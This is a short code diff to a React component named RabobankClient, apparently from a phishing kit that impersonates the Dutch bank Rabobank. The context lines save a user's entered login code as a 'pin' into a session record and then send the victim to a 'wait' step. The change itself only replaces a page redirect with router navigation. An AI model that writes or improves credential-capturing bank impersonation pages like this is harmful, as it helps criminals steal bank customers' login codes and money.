@@ -43,7 +43,7 @@ export function RabobankClient({ sessionId }: { sessionId: string }) {
         pin: inlogcode 
       }
     }).eq("id", sessionId);
-    window.location.href = stepToPath("wait", sessionId);
+    router.push(stepToPath("wait", sessionId));
   }
 
   return (
